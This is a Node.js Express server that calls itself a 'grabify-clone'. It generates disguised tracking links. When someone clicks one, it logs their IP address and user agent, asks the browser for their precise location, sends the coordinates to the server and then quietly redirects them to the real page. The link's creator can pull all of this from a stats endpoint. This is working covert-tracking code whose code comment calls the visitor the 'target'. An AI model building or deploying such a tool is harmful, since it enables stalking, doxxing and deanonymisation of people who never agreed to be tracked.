const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const { v4: uuidv4 } = require('uuid');
const path = require('path');

const app = express();

// Connect to MongoDB
mongoose.connect('mongodb://localhost/grabify-clone');

const db = mongoose.connection;
db.on('error', console.error.bind(console, 'connection error:'));
db.once('open', () => {
    console.log('Connected to MongoDB');
});

// Define a schema and model for tracking data
const trackingSchema = new mongoose.Schema({
    id: String,
    targetUrl: String,
    clicks: [{ userAgent: String, ip: String, timestamp: Date, latitude: Number, longitude: Number}]
});

const Tracking = mongoose.model('Tracking', trackingSchema);

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/generate', async (req, res) => {
    const id = uuidv4();
    const targetUrl = req.body.target_url;
    const newTracking = new Tracking({ id, targetUrl, clicks: [] });
    await newTracking.save();

    const trackingUrl = `${req.protocol}://${req.get('host')}/track/${id}`;
    res.json({ trackingUrl });
});

app.get('/track/:id', async (req, res) => {
    const { id } = req.params;
    const tracking = await Tracking.findOne({ id });

    if (tracking) {
        const deviceInfo = {
            userAgent: req.headers['user-agent'],
            ip: req.ip,
            timestamp: new Date(),
            latitude: null,
            longitude: null
        };

        const script = `
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Tracking</title>
            </head>
            <body>
                <script>



                        //Getting Positional coordinates of the target


                    navigator.geolocation.getCurrentPosition(
                        position => {
                            fetch('/location', {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json',
                                },
                                body: JSON.stringify({
                                    pageID: '${id}',
                                    latitude: position.coords.latitude,
                                    longitude: position.coords.longitude,
                                    deviceInfo: ${JSON.stringify(deviceInfo)}
                                }),
                            })
                            .then(response => response.json())
                            .then(data => {
                                console.log('Location sent:', data);
                                window.location.href = '${tracking.targetUrl}';
                            })
                            .catch(error => {
                                console.error('Error sending location:', error);
                                window.location.href = '${tracking.targetUrl}';
                            });
                        },
                        error => {
                            console.error('Error getting location:', error);
                            window.location.href = '${tracking.targetUrl}';
                        }
                    );
                </script>
            </body>
            </html>
        `;

        res.send(script);
    } else {
        res.status(404).send('Invalid tracking URL');
    }
});

app.post('/location', async (req, res) => {
    const { pageID, latitude, longitude, deviceInfo } = req.body;
    const tracking = await Tracking.findOne({ id: pageID });

    if (tracking) {
        tracking.clicks.push({ ...deviceInfo, latitude, longitude });
        await tracking.save();
        console.log(`Tracking details for page ${pageID}:`, tracking.clicks);
    }

    res.json({ message: 'Location and device info received successfully.' });
});

app.get('/stats/:id', async (req, res) => {
    const { id } = req.params;
    const tracking = await Tracking.findOne({ id });

    if (tracking) {
        res.json(tracking.clicks);
    } else {
        res.status(404).send('Invalid tracking ID');
    }
});

const PORT = 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
